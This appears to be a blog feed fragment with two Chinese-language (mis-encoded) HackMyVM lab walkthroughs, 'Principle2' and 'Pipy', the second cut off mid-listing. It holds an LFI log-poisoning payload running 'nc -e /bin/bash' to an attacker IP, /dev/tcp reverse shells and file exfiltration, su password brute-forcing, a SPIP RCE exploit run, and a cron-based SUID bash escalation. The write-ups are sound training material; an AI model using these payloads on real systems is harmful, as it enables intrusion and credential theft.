ÂõæÁâáÈáåÈöêËóè‰∫Ü‰∏Ä‰∏™ÂüüÂêçÔºåÂä†ÂÖ•Êàë‰ª¨ÁöÑhosts‰∏≠

![image](https://github.com/user-attachments/assets/bf14a672-496c-47db-a98f-1d17f6ed094f)

Ê≠§Âú∞Êó†Èì∂‰∏âÁôæ‰∏§ÔºåÁàÜÁ†¥ÁõÆÂΩï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://thetruthoftalos.hmv/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://thetruthoftalos.hmv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 169] [--&gt; http://thetruthoftalos.hmv/uploads/]
/index.html           (Status: 200) [Size: 8]
/index.php            (Status: 200) [Size: 1970]
Progress: 51629 / 311425 (16.58%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 53720 / 311425 (17.25%)
===============================================================
Finished
===============================================================

```

`index.php`Â§ßÂ∞èÊòéÊòæ‰∏ç‰∏ÄÊ†∑

![image](https://github.com/user-attachments/assets/def8e796-ace3-4ebd-8bcf-63b4dd56fd70)

‰Ω†Âú®ËæìÂÖ•Ê°Ü‰∏≠ËæìÂÖ•ÁÇπ‰∏úË•øÔºå‰Ω†Â∞±‰ºöÂèëÁé∞‰∏Ä‰∫õÊúâË∂£ÁöÑ‰∏úË•ø

![image](https://github.com/user-attachments/assets/ef4998a3-1dc8-41db-98ca-1f051c15be67)

ÁúãÁùÄÂ∞±ÂÉèÊúâ**Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û**

![image](https://github.com/user-attachments/assets/6ad575b8-807f-4354-a765-f58955103354)

ÂõûÊòæ‰∏çÂØπÔºåÂ∫îËØ•Ë¶Å**ÂèåÈáçÁªïËøá**

![image](https://github.com/user-attachments/assets/8059191e-e3d0-4dfc-bec9-2f6e559e1037)

ÊàêÂäüËé∑Âæó`/etc/passwd`ÔºåÂõ†‰∏∫Ê≤°ÊúâsshÁ´ØÂè£ÔºåÊâÄ‰ª•Â∞ùËØï‰∏Ä‰∏ãÊó•ÂøóÂåÖÂê´ÔºåÊàë‰ª¨Áúã‰∏Ä‰∏ãÂÆÉÁöÑÊû∂ÊûÑ

![image](https://github.com/user-attachments/assets/916682c6-d518-4861-95d1-48509d52fc09)

```bash
/var/log/nginx/access.log
/var/log/nginx/error.log
```

![image](https://github.com/user-attachments/assets/c6c9fd0e-ed0c-488b-b078-78f1ce1afc82)

ÂèØ‰ª•ÂõûÊòæÔºåÊàë‰ª¨ÊûÑÈÄ†‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ curl http://thetruthoftalos.hmv/shell -H 'User-Agent: &lt;?php exec('nc -e /bin/bash 192.168.205.141 8888')  ?&gt;'
&lt;html&gt;
&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.22.1&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ curl http://thetruthoftalos.hmv/index.php?filename=....//....//....//....///var/log/nginx/access.log       


```

Âç°‰ΩèÂ∞±ÊòØÂºπÂõûÊù•‰∫Ü

---

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑Âèñ**ÂèçÂêë shell** ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ**‰∫§‰∫íÂºè** **TTY shell**Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

# 4.ÊèêÊùÉ

‰∏äÊù•‰ª•ÂêéËΩ¨‰∫Ü‰∏ÄÂúàÈÉΩÊ≤°ÂèëÁé∞‰ªÄ‰πàÊúâÊÑèÊÄùÁöÑ‰∏úË•øÔºåÊàëÂ∞±Áõ¥Êé•Áî©‰∫Ü‰∏Ä‰∏™linpeas.sh‰∏äÊù•‰∫Ü,‰πüÊó†ÊûúÔºå‰ΩÜÊòØÊü•ÁúãpspyÁúãÂÆöÊó∂‰ªªÂä°ÁöÑÊó∂ÂÄôÂèëÁé∞‰∫ÜËøô‰∏™

![image](https://github.com/user-attachments/assets/f2784510-9099-4ca4-969b-ceaf646ef46b)

‰ΩÜÊòØÊàë‰ª¨Ê≤°Êúâ‰øÆÊîπÁöÑÊùÉÈôê

```bash
www-data@principle2:/tmp$ ls -la /usr/local/share/report
-rwxrwx--- 1 root talos 16584 Nov 25  2023 /usr/local/share/report

principle2:/home/talos$ sudo -u talos cat /usr/local/share/report &gt; /tmp/report
www-data@principle2:/home/talos$ cd /tmp/
www-data@principle2:/tmp$ cat report &gt; /dev/tcp/192.168.205.141/7777
```

Êã∑ËøáÊù•ÁúãÁúãÂÖ∑‰ΩìËøêË°å‰ªÄ‰πà

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ strings report 
/lib64/ld-linux-x86-64.so.2
fgets
rewind
perror
fread
exit
fopen
strstr
pclose
__libc_start_main
__cxa_finalize
popen
fclose
fputs
fwrite
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
write www-data
You are not allowed to be here
Error sending message to www-data
/opt/users.txt
Error opening output file
Error executing 'who' command
www-data
New information appended to '/opt/users'
No new information to append
;*3$'
GCC: (Debian 13.2.0-5) 13.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
report.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
fread@GLIBC_2.2.5
_edata
fclose@GLIBC_2.2.5
_fini
rewind@GLIBC_2.2.5
pclose@GLIBC_2.2.5
fputs@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
notifyNotAllowed
__bss_start
main
popen@GLIBC_2.2.5
fopen@GLIBC_2.2.5
perror@GLIBC_2.2.5
exit@GLIBC_2.2.5
fwrite@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
strstr@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
                       
```

Ê≤°ÊúâÂèëÁé∞‰ªÄ‰πàÊòéÊòæÂà©Áî®ÁÇπÔºåÊÉ≥ÁùÄÊãø‰πãÂâçÁöÑÂØÜÁ†ÅÂ∞ùËØïÁôªÂΩïÁöÑÊó∂ÂÄôÔºåÂèëÁé∞Êúâ‰πãÂâç**SMBÊúçÂä°**ÁöÑ`hermanubis`Áî®Êà∑ÔºàÈ™ÇÁöÑÂæàËÑèÔºâ

```bash
www-data@principle2:/tmp$ ls /home/
byron  city  hermanubis  melville  talos

www-data@principle2:/tmp$ su - hermanubis
Password: 
$ id
uid=1002(hermanubis) gid=1002(hermanubis) groups=1002(hermanubis)
$ sudo -l
Matching Defaults entries for hermanubis on principle2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User hermanubis may run the following commands on principle2:
    (talos) NOPASSWD: /usr/bin/cat

$ cd /home/hermanubis
$ ls
investigation.txt  share  user.txt
$ cat investigation.txt 
I am aware that Byron hates me... especially since I lost my password.
My friends along with myself after several analyses and attacks, we have detected that Melville is using a 32 character password....
What he doesn't know is that it is in the Byron database...

# ÁøªËØë
ÊàëÁü•ÈÅìÊãú‰º¶ËÆ®ÂéåÊàë‚Ä¶‚Ä¶Â∞§ÂÖ∂ÊòØËá™‰ªéÊàëÂøòËÆ∞ÂØÜÁ†Å‰πãÂêé„ÄÇ
ÊàëÂíåÊàëÁöÑÊúãÂèã‰ª¨ÁªèËøáÂ§öÊ¨°ÂàÜÊûêÂíåÊîªÂáªÔºåÂèëÁé∞Ê¢ÖÂ∞îÁª¥Â∞î‰ΩøÁî®ÁöÑÂØÜÁ†ÅÊòØ 32 ‰∏™Â≠óÁ¨¶‚Ä¶‚Ä¶
‰ΩÜ‰ªñ‰∏çÁü•ÈÅìÁöÑÊòØÔºåËøô‰∏™ÂØÜÁ†ÅÂ∞±Âú®Êãú‰º¶ÁöÑÊï∞ÊçÆÂ∫ì‰∏≠‚Ä¶‚Ä¶
```

ByronÂ∞±ÊòØ‰πãÂâçÈÇ£‰∏™Â∏ÇÈïøÔºå32‰∏™Â≠óÁ¨¶Â∞±ÊòØÈÇ£‰∏™16ËøõÂà∂Ë°®ÔºåÊãøËøáÊù•ÁàÜÁ†¥‰∏Ä‰∏ãÂ∞±Â•Ω‰∫Ü

```bash
$ cd /tmp
$ ./suForce -u melville -w a.txt 
            _____                        
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 code: d4t4s3c     version: v1.0.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üéØ Username | melville
üìñ Wordlist | a.txt
üîé Status   | 54/1001/5%/1bd5528b6def9812acba8eb21562c3ec
üí• Password | 1bd5528b6def9812acba8eb21562c3ec
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ


$ su - melville
Password: 
root is watching you, it has a record of all your steps:

melville@principle2:~$ id
uid=1003(melville) gid=1003(melville) groups=1003(melville),1000(talos)

```

melvilleÁî®Êà∑Êúâ`talos`ÁöÑÊùÉÈôêÔºåÂèØ‰ª•‰øÆÊîπ/usr/local/share/reportÊñá‰ª∂ÔºåÊàë‰ª¨ÊääbashÂä†‰∏™ÊùÉÈôêÂ∞±Â•Ω‰∫Ü

```bash
melville@principle2:~$ vi /usr/local/share/report
melville@principle2:~$ cat /usr/local/share/report
#!/bin/bash
chmod +s /bin/bash
```

ÁÑ∂ÂêéÁ≠âÂ∞±Â•Ω‰∫ÜÔºåÁ≠âÂÆÉÂÆöÊó∂‰ªªÂä°Ëß¶Âèë

```bash
melville@principle2:/tmp$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
melville@principle2:/tmp$ bash -p
bash-5.2# id
uid=1003(melville) gid=1003(melville) euid=0(root) egid=0(root) groups=0(root),1000(talos),1003(melville)

```

‰∏ãÁè≠sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Principle2.html</guid><pubDate>Fri, 27 Jun 2025 09:33:31 +0000</pubDate></item><item><title>hmv_Pipy</title><link>https://7r1UMPHK.github.io/post/hmv_Pipy.html</link><description># hmv_Pipy

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - Pipy](https://hackmyvm.eu/machines/machine.php?vm=Pipy)
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.143
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 10:33 CST
Nmap scan report for tiny.hmv (192.168.205.143)
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:47:C9:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

ÂÖàÁúã**80Á´ØÂè£**Ôºå**22Á´ØÂè£**ÂÄôË°•

# 2.Ë∏©ÁÇπ

![Image](https://github.com/user-attachments/assets/864afc4f-50bc-4481-9a21-60be11e82b62)

Êâ´ÊèèÊúâÊ≤°ÊúâÊºèÊ¥ûÔºà‰∏çÂæó‰∏çËØ¥ÔºåÁæ§ÈáåÈù¢ÁöÑwebÂ§ß‰Ω¨**Anjv-W.**  Êé®ËçêÁöÑÊâ´Ê¥ûÂ∑•ÂÖ∑Â∞±ÊòØÂ•ΩÁî®ÔºåÁÇπËµûüëçÔºâ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nuclei -u http://192.168.205.143               

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 154
[INF] Templates loaded for current scan: 7607
[INF] Executing 7425 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 182 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1702 (Reduced 1602 Requests)
[INF] Using Interactsh Server: oast.online
[CVE-2024-8517] [http] [critical] http://192.168.205.143/spip.ph%70?pag%65=spip_pass&amp;lang=fr
[waf-detect:apachegeneric] [http] [info] http://192.168.205.143
[openssh-detect] [tcp] [info] 192.168.205.143:22 ['SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4']
[ssh-password-auth] [javascript] [info] 192.168.205.143:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.143:22
[ssh-server-enumeration] [javascript] [info] 192.168.205.143:22 ['SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4']
[ssh-auth-methods] [javascript] [info] 192.168.205.143:22 ['['publickey','password']']
[CVE-2023-48795] [javascript] [medium] 192.168.205.143:22 ['Vulnerable to Terrapin']
[composer-config:composer.json] [http] [info] http://192.168.205.143/composer.json
[composer-config:composer.json] [http] [info] http://192.168.205.143/vendor/composer/installed.json
[metatag-cms] [http] [info] http://192.168.205.143 ['SPIP 4.2.0']
[readme-md] [http] [info] http://192.168.205.143/README.md
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.143
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.143
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.143
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.143
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.143
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.143
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.143
[apache-detect] [http] [info] http://192.168.205.143 ['Apache/2.4.52 (Ubuntu)']
[spip-detect:spip_version] [http] [info] http://192.168.205.143 ['4.2.0']
[configuration-listing] [http] [medium] http://192.168.205.143/config/
```

Êúâ‰∏Ä‰∏™[CVE-2024-8517](https://github.com/Chocapikk/CVE-2024-8517)ÊºèÊ¥ûÔºåÊàë‰ª¨Âà©Áî®‰∏Ä‰∏ã

![Image](https://github.com/user-attachments/assets/7cd77edc-68bf-4898-847d-19a65f300d12)

ÈùûÊéàÊùÉËøúÁ®ãÊâßË°åÊõ¥ÂñúÊ¨¢‰∫Üü§©

```bash
git clone https://github.com/Chocapikk/CVE-2024-8517.git
cd CVE-2024-8517
python3 -m venv env
source env/bin/activate
pip install -r requirements.txt 
‚îå‚îÄ‚îÄ(env)‚îÄ(kali„âøkali)-[~/test/tmp/CVE-2024-8517]
‚îî‚îÄ$ python3 exploit.py -u http://192.168.205.143          
‚úÖ Target is vulnerable! Command Output: www-data
                                                                                                                                     
‚Ñπ  Interactive shell started. Type `exit` to quit.
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

deactivate #ÈÄÄÂá∫ËôöÊãüÁéØÂ¢ÉÂëΩ‰ª§
rm -rf env #Âà†Èô§ËôöÊãüÁéØÂ¢É
```

ÊàêÂäüÔºå‰ΩÜÊòØÊàë‰ª¨Ë¶ÅÂºπ‰∏™**ÂèçÂºπshell**ÂõûÂéªÔºåÂõ†‰∏∫ÂÆÉËøô‰∏™ËÑöÊú¨ÁöÑshellÊúâÈôêÂà∂

```bash
$ bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'
```

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑Âèñ**ÂèçÂêë shell** ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ**‰∫§‰∫íÂºè** **TTY shell**Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ÊèêÊùÉ

```bash
www-data@pipy:/var/www/html$ sudo -l
[sudo] password for www-data: 
sudo: a password is required
www-data@pipy:/var/www/html$ ls -la
total 156
drwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 .
drwxr-xr-x  4 www-data www-data  4096 Oct  5  2023 ..
-rw-r--r--  1 www-data www-data  7045 Feb 23  2023 CHANGELOG.md
drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 IMG
-rw-r--r--  1 www-data www-data 35147 Feb 23  2023 LICENSE
-rw-r--r--  1 www-data www-data   842 Feb 23  2023 README.md
-rw-r--r--  1 www-data www-data   178 Feb 23  2023 SECURITY.md
-rw-r--r--  1 www-data www-data  1761 Feb 23  2023 composer.json
-rw-r--r--  1 www-data www-data 27346 Feb 23  2023 composer.lock
drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 config
drwxr-xr-x 22 www-data www-data  4096 Oct  3  2023 ecrire
-rw-r--r--  1 www-data www-data  4307 Feb 23  2023 htaccess.txt
-rw-r--r--  1 www-data www-data    42 Feb 23  2023 index.php
drwxr-xr-x  5 www-data www-data  4096 Oct  3  2023 local
drwxr-xr-x 22 www-data www-data  4096 Oct  3  2023 plugins-dist
-rw-r--r--  1 www-data www-data  3645 Feb 23  2023 plugins-dist.json
drwxr-xr-x 12 www-data www-data  4096 Oct  3  2023 prive
-rw-r--r--  1 www-data www-data   973 Feb 23  2023 spip.php
-rw-r--r--  1 www-data www-data  1212 Feb 23  2023 spip.png
-rw-r--r--  1 www-data www-data  1673 Feb 23  2023 spip.svg
drwxr-xr-x 10 www-data www-data  4096 Oct  3  2023 squelettes-dist
drwxr-xr-x  5 www-data www-data  4096 Jan 18 02:35 tmp
drwxr-xr-x  6 www-data www-data  4096 Oct  3  2023 vendor
www-data@pipy:/var/www/html$ cd config/
www-data@pipy:/var/www/html/config$ ls -al
total 48
drwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 .
drwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 ..
-rw-rw-rw-  1 www-data www-data   197 Oct  3  2023 .htaccess
-rw-rw-rw-  1 www-data www-data     0 Oct  3  2023 .ok
-rw-rw-rw-  1 www-data www-data   109 Oct  3  2023 chmod.php
-rw-rw-rw-  1 www-data www-data   163 Oct  3  2023 cles.php
-rw-rw-rw-  1 www-data www-data   243 Oct  3  2023 connect.php
-rw-r--r--  1 www-data www-data 17240 Feb 23  2023 ecran_securite.php
-rw-r--r--  1 www-data www-data    83 Feb 23  2023 remove.txt
www-data@pipy:/var/www/html/config$ cat connect.php
&lt;?php
if (!defined('_ECRIRE_INC_VERSION')) return;
defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
$GLOBALS['spip_connect_version'] = 0.8;
spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
www-data@pipy:/var/www/html/config$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 503
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; use spip;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [spip]&gt; show tables;
+-------------------------+
| Tables_in_spip          |
+-------------------------+
| spip_articles           |
| spip_auteurs            |
| spip_auteurs_liens      |
| spip_depots             |
| spip_depots_plugins     |
| spip_documents          |
| spip_documents_liens    |
| spip_forum              |
| spip_groupes_mots       |
| spip_jobs               |
| spip_jobs_liens         |
| spip_meta               |
| spip_mots               |
| spip_mots_liens         |
| spip_paquets            |
| spip_plugins            |
| spip_referers           |
| spip_referers_articles  |
| spip_resultats          |
| spip_rubriques          |
| spip_syndic             |
| spip_syndic_articles    |
| spip_types_documents    |
| spip_urls               |
| spip_versions           |
| spip_versions_fragments |
| spip_visites            |
| spip_visites_articles   |
+-------------------------+
28 rows in set (0.000 sec)

MariaDB [spip]&gt; select * from spip_auteurs\G
*************************** 1. row ***************************
   id_auteur: 1
         nom: Angela
         bio: 
       email: angela@pipy.htb
    nom_site: 
    url_site: 
       login: angela
        pass: 4ng3l4
     low_sec: 
      statut: 0minirezo
   webmestre: oui
         maj: 2023-10-04 17:28:39
         pgp: 
      htpass: 
    en_ligne: 2023-10-04 13:50:34
 alea_actuel: 387046876651c39a45bc836.13502903
  alea_futur: 465278670651d6da4349d85.01841245
       prefs: a:4:{s:7:'couleur';i:2;s:7:'display';i:2;s:18:'display_navigation';s:22:'navigation_avec_icones';s:3:'cnx';s:0:'';}
cookie_oubli: NULL
      source: spip
        lang: 
    imessage: 
 backup_cles: 3HnqCYcjg+hKOjCODrOTwhvDGXqQ34zRxFmdchyPL7wVRW3zsPwE6+4q0GlAPo4b4OGRmzvR6NNFdEjARDtoeIAxH88cQZt2H3ENUggrz99vFfCmWHIdJgSDSOI3A3nmnfEg43BDP4q9co/AP0XIlGzGteMiSJwc0fCXOCxzCW9NwvzJYM/u/8cWGGdRALd7fzFYhOY6DmokVnIlwauc8/lwRyNbam1H6+g5ju57cI8Dzll+pCMUPhhti9RvC3WNzC2IUcPnHEM=
*************************** 2. row ***************************
   id_auteur: 2
         nom: admin
         bio: 
       email: admin@pipy.htb
    nom_site: 
    url_site: 
       login: admin
        pass: $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2
     low_sec: 
      statut: 1comite
   webmestre: non
         maj: 2023-10-04 17:31:03
         pgp: 
      htpass: 
    en_ligne: 2023-10-04 17:31:03
 alea_actuel: 1540227024651d7e881c21a5.84797952
  alea_futur: 439334464651da1526dbb90.67439545
       prefs: a:4:{s:7:'couleur';i:2;s:7:'display';i:2;s:18:'display_navigation';s:22:'navigation_avec_icones';s:3:'cnx';s:0:'';}
cookie_oubli: 1118839.6HqFdtVwUs3T6+AJRJOdnZG6GFPNzl4/wAh9i0D1bqfjYKMJSG63z4KPzonGgNUHz+NmYNLbcIM83Tilz5NYrlGKbw4/cDDBE1mXohDXwEDagYuW2kAUYeqd8y5XqDogNsLGEJIzn0o=
      source: spip
        lang: fr
    imessage: oui
 backup_cles: 
2 rows in set (0.000 sec)
```

ÂàáÊç¢Ëá≥`angela`

```bash
www-data@pipy:/var/www/html/config$ su - angela
Password: 
angela@pipy:~$ id
uid=1000(angela) gid=1000(angela) groups=1000(angela)
```

ÁªßÁª≠ÊèêÊùÉ

```bash
angela@pipy:~$ ls -la
total 40
drwxr-x--- 6 angela angela 4096 Oct 17  2023 .
drwxr-xr-x 3 root   root   4096 Oct  4  2023 ..
lrwxrwxrwx 1 angela angela    9 Oct 17  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 angela angela  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 angela angela 3771 Jan  6  2022 .bashrc
drwx------ 3 angela angela 4096 Oct  5  2023 .cache
drwxrwxr-x 3 angela angela 4096 Oct  3  2023 .local
-rw-r--r-- 1 angela angela  807 Jan  6  2022 .profile
drwx------ 3 angela angela 4096 Oct  3  2023 snap
drwx------ 2 angela angela 4096 Oct  2  2023 .ssh
-rw-r--r-- 1 angela angela    0 Oct  2  2023 .sudo_as_admin_successful
-rw------- 1 angela angela   33 Oct  5  2023 user.txt
angela@pipy:~$ cd /opt/
angela@pipy:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Aug 10  2023 .
drwxr-xr-x 19 root root 4096 Oct  2  2023 ..
angela@pipy:/opt$ cd /tmp/
angela@pipy:/tmp$ ls -al
total 12
drwxrwxrwt  2 root     root     4096 Jan 18 02:44 .
drwxr-xr-x 19 root     root     4096 Oct  2  2023 ..
-rw-------  1 www-data www-data   19 Jan 18 02:44 phpMHrr6q
angela@pipy:/tmp$ cd /mnt/
angela@pipy:/mnt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Aug 10  2023 .
drwxr-xr-x 19 root root 4096 Oct  2  2023 ..
angela@pipy:/mnt$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/su
/usr/bin/pkexec
/snap/snapd/23545/usr/lib/snapd/snap-confine
/snap/snapd/20092/usr/lib/snapd/snap-confine
/snap/core20/2434/usr/bin/chfn
/snap/core20/2434/usr/bin/chsh
/snap/core20/2434/usr/bin/gpasswd
/snap/core20/2434/usr/bin/mount
/snap/core20/2434/usr/bin/newgrp
/snap/core20/2434/usr/bin/passwd
/snap/core20/2434/usr/bin/su
/snap/core20/2434/usr/bin/sudo
/snap/core20/2434/usr/bin/umount
/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2434/usr/lib/openssh/ssh-keysign
/snap/core20/2015/usr/bin/chfn
/snap/core20/2015/usr/bin/chsh
/snap/core20/2015/usr/bin/gpasswd
/snap/core20/2015/usr/bin/mount
/snap/core20/2015/usr/bin/newgrp
/snap/core20/2015/usr/bin/passwd
/snap/core20/2015/usr/bin/su
/snap/core20/2015/usr/bin/sudo
/snap/core20/2015/usr/bin/umount
/snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2015/usr/lib/openssh/ssh-keysign
/snap/core/17200/bin/mount
/snap/core/17200/bin/ping
/snap/core/17200/bin/ping6
/snap/core/17200/bin/su
/snap/core/17200/bin/umount
/snap/core/17200/usr/bin/chfn
/snap/core/17200/usr/bin/chsh
/snap/core/17200/usr/bin/gpasswd
/snap/core/17200/usr/bin/newgrp
/snap/core/17200/usr/bin/passwd
/snap/core/17200/usr/bin/sudo
/snap/core/17200/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/17200/usr/lib/openssh/ssh-keysign
/snap/core/17200/usr/lib/snapd/snap-confine
/snap/core/17200/usr/sbin/pppd
/snap/core/16202/bin/mount
